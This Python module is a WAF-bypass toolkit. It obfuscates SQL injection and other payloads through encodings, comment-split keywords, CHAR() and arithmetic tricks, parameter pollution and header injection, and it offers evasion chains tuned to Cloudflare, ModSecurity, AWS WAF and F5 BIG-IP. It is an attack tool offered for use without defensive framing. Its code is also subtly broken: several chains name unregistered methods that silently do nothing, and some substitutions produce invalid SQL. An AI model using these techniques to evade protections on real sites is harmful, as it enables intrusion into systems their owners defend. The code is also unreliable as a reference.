"""
WAF bypass methods and techniques
"""

import re
import urllib.parse
import base64
import random
import string
from typing import Dict, List, Tuple, Any


class BypassMethods:
    """
    Collection of WAF bypass techniques and payload transformations.
    """
    
    def __init__(self):
        """
        Initialize bypass methods with various encoding and obfuscation techniques.
        """
        self.encoding_methods = {
            'url': self._url_encode,
            'double_url': self._double_url_encode,
            'unicode': self._unicode_encode,
            'hex': self._hex_encode,
            'base64': self._base64_encode,
            'html_entity': self._html_entity_encode
        }
        
        self.obfuscation_methods = {
            'case_variation': self._case_variation,
            'comment_insertion': self._comment_insertion,
            'whitespace_manipulation': self._whitespace_manipulation,
            'keyword_replacement': self._keyword_replacement,
            'function_obfuscation': self._function_obfuscation,
            'arithmetic_obfuscation': self._arithmetic_obfuscation,
            'string_concatenation': self._string_concatenation
        }
        
        self.advanced_methods = {
            'http_parameter_pollution': self._http_parameter_pollution,
            'chunked_encoding': self._chunked_encoding,
            'verb_tampering': self._verb_tampering,
            'header_injection': self._header_injection
        }
    
    def apply_bypass_method(self, payload: str, method: str, **kwargs) -> str:
        """
        Apply a specific bypass method to a payload.
        
        Args:
            payload: Original payload
            method: Bypass method name
            **kwargs: Additional parameters for the method
            
        Returns:
            Modified payload
        """
        # Check encoding methods
        if method in self.encoding_methods:
            return self.encoding_methods[method](payload, **kwargs)
        
        # Check obfuscation methods
        elif method in self.obfuscation_methods:
            return self.obfuscation_methods[method](payload, **kwargs)
        
        # Check advanced methods
        elif method in self.advanced_methods:
            return self.advanced_methods[method](payload, **kwargs)
        
        else:
            return payload
    
    def get_available_methods(self) -> List[str]:
        """
        Get list of all available bypass methods.
        
        Returns:
            List of method names
        """
        all_methods = []
        all_methods.extend(self.encoding_methods.keys())
        all_methods.extend(self.obfuscation_methods.keys())
        all_methods.extend(self.advanced_methods.keys())
        return all_methods
    
    # Encoding Methods
    def _url_encode(self, payload: str, **kwargs) -> str:
        """URL encode the payload."""
        return urllib.parse.quote(payload, safe='')
    
    def _double_url_encode(self, payload: str, **kwargs) -> str:
        """Apply double URL encoding."""
        single_encoded = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(single_encoded, safe='')
    
    def _unicode_encode(self, payload: str, format_type: str = '%u', **kwargs) -> str:
        """
        Apply Unicode encoding.
        
        Args:
            payload: Payload to encode
            format_type: Unicode format ('%u' or '\\u')
        """
        encoded = ''
        for char in payload:
            if char.isalnum():
                encoded += char
            else:
                if format_type == '%u':
                    encoded += f'%u{ord(char):04x}'
                else:
                    encoded += f'\\u{ord(char):04x}'
        return encoded
    
    def _hex_encode(self, payload: str, prefix: str = '0x', **kwargs) -> str:
        """
        Apply hexadecimal encoding.
        
        Args:
            payload: Payload to encode
            prefix: Hex prefix ('0x' or '\\x')
        """
        if prefix == '0x':
            # SQL hex format
            hex_values = []
            for char in payload:
                hex_values.append(f'{ord(char):02x}')
            return f"0x{''.join(hex_values)}"
        else:
            # Standard hex escape format
            encoded = ''
            for char in payload:
                if char.isalnum():
                    encoded += char
                else:
                    encoded += f'\\x{ord(char):02x}'
            return encoded
    
    def _base64_encode(self, payload: str, **kwargs) -> str:
        """Apply Base64 encoding."""
        return base64.b64encode(payload.encode()).decode()
    
    def _html_entity_encode(self, payload: str, **kwargs) -> str:
        """Apply HTML entity encoding."""
        html_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
            ' ': '&#x20;'
        }
        
        encoded = payload
        for char, entity in html_entities.items():
            encoded = encoded.replace(char, entity)
        return encoded
    
    # Obfuscation Methods
    def _case_variation(self, payload: str, variation_method: str = 'random', method: str = 'random', **kwargs) -> str:
        """
        Apply case variation to the payload.

        Args:
            payload: Payload to modify
            variation_method: Variation method ('random', 'alternate', 'upper', 'lower')
            method: Legacy parameter name (for backward compatibility)
        """
        # Use variation_method if provided, otherwise fall back to method
        actual_method = variation_method if 'variation_method' in kwargs or variation_method != 'random' else method

        if actual_method == 'random':
            return ''.join(char.upper() if random.choice([True, False]) else char.lower() 
                          for char in payload)
        elif actual_method == 'alternate':
            return ''.join(char.upper() if i % 2 == 0 else char.lower()
                          for i, char in enumerate(payload))
        elif actual_method == 'upper':
            return payload.upper()
        elif actual_method == 'lower':
            return payload.lower()
        else:
            return payload
    
    def _comment_insertion(self, payload: str, comment_type: str = '/**/', **kwargs) -> str:
        """
        Insert comments within the payload.
        
        Args:
            payload: Payload to modify
            comment_type: Type of comment ('/**/', '--', '#')
        """
        if comment_type == '/**/':
            # Insert /**/ between keywords
            keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR']
            modified = payload
            for keyword in keywords:
                modified = re.sub(
                    rf'\b{keyword}\b', 
                    f'{keyword[:len(keyword)//2]}/**/{keyword[len(keyword)//2:]}', 
                    modified, 
                    flags=re.IGNORECASE
                )
            return modified
        elif comment_type == '--':
            # Add line comments
            return payload + '--'
        elif comment_type == '#':
            # Add MySQL-style comments
            return payload + '#'
        else:
            return payload
    
    def _whitespace_manipulation(self, payload: str, manipulation_method: str = 'tabs', method: str = 'tabs', **kwargs) -> str:
        """
        Manipulate whitespace in the payload.

        Args:
            payload: Payload to modify
            manipulation_method: Whitespace method ('tabs', 'newlines', 'multiple_spaces', 'mixed')
            method: Legacy parameter name (for backward compatibility)
        """
        # Use manipulation_method if provided, otherwise fall back to method
        actual_method = manipulation_method if 'manipulation_method' in kwargs or manipulation_method != 'tabs' else method

        if actual_method == 'tabs':
            return payload.replace(' ', '\t')
        elif actual_method == 'newlines':
            return payload.replace(' ', '\n')
        elif actual_method == 'multiple_spaces':
            return payload.replace(' ', '  ')  # Double spaces
        elif actual_method == 'mixed':
            replacements = ['\t', '\n', '  ', '\r']
            modified = payload
            for space in re.finditer(r' ', payload):
                replacement = random.choice(replacements)
                modified = modified[:space.start()] + replacement + modified[space.end():]
            return modified
        else:
            return payload
    
    def _keyword_replacement(self, payload: str, **kwargs) -> str:
        """
        Replace SQL keywords with alternatives.
        
        Args:
            payload: Payload to modify
        """
        replacements = {
            'SELECT': ['DISTINCT', 'ALL'],
            'UNION': ['UNION ALL', 'UNION DISTINCT'],
            'AND': ['&&'],
            'OR': ['||'],
            'WHERE': ['HAVING'],
            '=': ['LIKE', 'REGEXP'],
            'SLEEP': ['BENCHMARK']
        }
        
        modified = payload
        for original, alternatives in replacements.items():
            if original in modified.upper():
                replacement = random.choice(alternatives)
                modified = re.sub(
                    rf'\b{original}\b', 
                    replacement, 
                    modified, 
                    flags=re.IGNORECASE
                )
        
        return modified
    
    def _function_obfuscation(self, payload: str, **kwargs) -> str:
        """
        Obfuscate using SQL functions.
        
        Args:
            payload: Payload to modify
        """
        # Replace string literals with CHAR() functions
        def replace_string(match):
            string_content = match.group(1)
            char_codes = [str(ord(char)) for char in string_content]
            return f"CHAR({','.join(char_codes)})"
        
        # Replace quoted strings
        modified = re.sub(r"'([^']*)'", replace_string, payload)
        
        # Replace simple numbers with arithmetic expressions
        def replace_number(match):
            num = int(match.group(0))
            if num <= 10:
                expressions = [
                    f"({num-1}+1)",
                    f"({num+1}-1)",
                    f"({num*2}/2)",
                    f"(SELECT {num})"
                ]
                return random.choice(expressions)
            return match.group(0)
        
        modified = re.sub(r'\b\d+\b', replace_number, modified)
        
        return modified
    
    def _arithmetic_obfuscation(self, payload: str, **kwargs) -> str:
        """
        Use arithmetic expressions for obfuscation.
        
        Args:
            payload: Payload to modify
        """
        # Replace simple boolean conditions
        replacements = {
            '1=1': ['2-1=1', '1*1=1', '1/1=1', '1+0=1'],
            '1=2': ['1=3-1', '2=1+1', '1=2*1'],
            '0=0': ['1-1=0', '0*1=0', '0/1=0']
        }
        
        modified = payload
        for original, alternatives in replacements.items():
            if original in modified:
                replacement = random.choice(alternatives)
                modified = modified.replace(original, replacement)
        
        return modified
    
    def _string_concatenation(self, payload: str, **kwargs) -> str:
        """
        Break strings using concatenation.
        
        Args:
            payload: Payload to modify
        """
        def replace_quoted_string(match):
            content = match.group(1)
            if len(content) > 3:
                mid = len(content) // 2
                part1 = content[:mid]
                part2 = content[mid:]
                return f"'{part1}'||'{part2}'"  # SQL concatenation
            return match.group(0)
        
        return re.sub(r"'([^']{4,})'", replace_quoted_string, payload)
    
    # Advanced Methods
    def _http_parameter_pollution(self, payload: str, **kwargs) -> Dict[str, List[str]]:
        """
        Create HTTP Parameter Pollution attack.
        
        Args:
            payload: Payload to use
            
        Returns:
            Dictionary with multiple parameter values
        """
        # Split payload across multiple parameters
        if len(payload) > 10:
            mid = len(payload) // 2
            return {
                'id': [payload[:mid], payload[mid:]],
                'param': [payload]
            }
        else:
            return {'id': [payload, payload]}
    
    def _chunked_encoding(self, payload: str, **kwargs) -> str:
        """
        Apply chunked transfer encoding concepts.
        
        Args:
            payload: Payload to modify
        """
        # This would typically be handled at the HTTP level
        # For payload modification, we'll split into chunks
        chunk_size = kwargs.get('chunk_size', 3)
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            chunks.append(chunk)
        
        return ''.join(chunks)  # Recombined for demonstration
    
    def _verb_tampering(self, payload: str, **kwargs) -> Dict[str, str]:
        """
        Suggest HTTP verb tampering.
        
        Args:
            payload: Payload to use
            
        Returns:
            Dictionary with method and payload
        """
        methods = ['POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
        return {
            'method': random.choice(methods),
            'payload': payload
        }
    
    def _header_injection(self, payload: str, **kwargs) -> Dict[str, str]:
        """
        Create headers for injection.
        
        Args:
            payload: Payload to inject
            
        Returns:
            Dictionary with headers
        """
        headers = {
            'X-Forwarded-For': payload,
            'X-Real-IP': payload,
            'X-Originating-IP': payload,
            'User-Agent': f"Mozilla/5.0 {payload}",
            'Referer': f"http://example.com/{payload}",
            'X-Custom-Header': payload
        }
        
        return headers
    
    def suggest_bypass_chain(self, payload: str, waf_type: str = 'generic') -> List[Dict[str, Any]]:
        """
        Suggest a chain of bypass methods for a specific WAF.
        
        Args:
            payload: Original payload
            waf_type: Type of WAF detected
            
        Returns:
            List of bypass steps
        """
        chains = {
            'cloudflare': [
                {'method': 'case_variation', 'params': {'variation_method': 'random'}},
                {'method': 'comment_insertion', 'params': {'comment_type': '/**/'}},
                {'method': 'double_url_encode', 'params': {}}
            ],
            'mod_security': [
                {'method': 'function_obfuscation', 'params': {}},
                {'method': 'whitespace_manipulation', 'params': {'manipulation_method': 'tabs'}},
                {'method': 'url_encode', 'params': {}}
            ],
            'aws_waf': [
                {'method': 'unicode_encode', 'params': {'format_type': '%u'}},
                {'method': 'arithmetic_obfuscation', 'params': {}},
                {'method': 'http_parameter_pollution', 'params': {}}
            ],
            'f5_bigip': [
                {'method': 'hex_encode', 'params': {'prefix': '0x'}},
                {'method': 'keyword_replacement', 'params': {}},
                {'method': 'header_injection', 'params': {}}
            ],
            'generic': [
                {'method': 'case_variation', 'params': {'variation_method': 'alternate'}},
                {'method': 'comment_insertion', 'params': {'comment_type': '/**/'}},
                {'method': 'url_encode', 'params': {}}
            ]
        }
        
        return chains.get(waf_type, chains['generic'])
    
    def apply_bypass_chain(self, payload: str, chain: List[Dict[str, Any]]) -> str:
        """
        Apply a series of bypass methods to a payload.
        
        Args:
            payload: Original payload
            chain: List of bypass methods to apply
            
        Returns:
            Final modified payload
        """
        modified_payload = payload
        
        for step in chain:
            method = step['method']
            params = step.get('params', {})
            
            try:
                modified_payload = self.apply_bypass_method(modified_payload, method, **params)
            except Exception:
                continue  # Skip failed transformations
        
        return modified_payload
    
    def generate_bypass_variants(self, payload: str, count: int = 5) -> List[str]:
        """
        Generate multiple bypass variants of a payload.
        
        Args:
            payload: Original payload
            count: Number of variants to generate
            
        Returns:
            List of payload variants
        """
        variants = []
        methods = self.get_available_methods()
        
        for _ in range(count):
            # Randomly select 1-3 methods
            num_methods = random.randint(1, 3)
            selected_methods = random.sample(methods, num_methods)
            
            variant = payload
            for method in selected_methods:
                try:
                    variant = self.apply_bypass_method(variant, method)
                except Exception:
                    continue
            
            if variant != payload and variant not in variants:
                variants.append(variant)
        
        return variants
